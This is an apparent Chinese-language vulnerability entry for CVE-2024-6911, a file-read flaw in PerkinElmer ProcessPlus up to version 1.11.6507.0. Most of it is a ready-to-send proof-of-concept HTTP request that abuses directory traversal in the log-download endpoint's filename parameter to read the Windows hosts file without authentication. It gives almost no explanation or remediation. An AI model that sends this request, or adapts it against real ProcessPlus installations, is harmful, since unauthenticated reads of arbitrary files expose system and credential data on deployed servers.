# PerkinElmer-ProcessPlus存在文件读取漏洞(CVE-2024-6911)

由于 PerkinElmer ProcessPlus 中包含本地文件，因此无需对外部方进行身份验证即可访问 Windows 系统上的文件。此问题影响 ProcessPlus：到 1.11.6507.0。



## poc

```java
GET /ProcessPlus/Log/Download/?filename=..\..\..\..\..\..\Windows\System32\drivers\etc\hosts&filenameWithSerialNumber=_Errors_2102162.log HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Ldwk: YmllY2hhb2xlc2I=
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1

```

